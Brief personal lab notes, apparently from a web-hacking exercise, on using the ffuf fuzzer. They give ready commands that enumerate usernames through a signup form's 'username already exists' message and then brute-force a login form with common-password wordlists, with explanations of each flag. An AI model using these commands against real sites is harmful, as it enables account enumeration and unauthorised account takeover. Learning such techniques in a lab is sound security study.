ffuf

-- enumerating with ffuf --
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/signup -mr "username already exists"
-w = wordlist
-X = HTTP method
-d = request body (FUZZ is a placeholder for the wordlist)
-H = header (without this, the request will fail)
-u = URL
-mr = match regex (we want to match the response that says "username already exists")
*** this ffuf will give you a wall of requests, unreadable
for slightly better readability, at least pipe grep so you have green markers
grep -iF "Status: 200"


is it all about ffuf? yes
are we brute-forcing a form using ffuf? yes

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200

the interesting part are the 2 wordlists
-w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
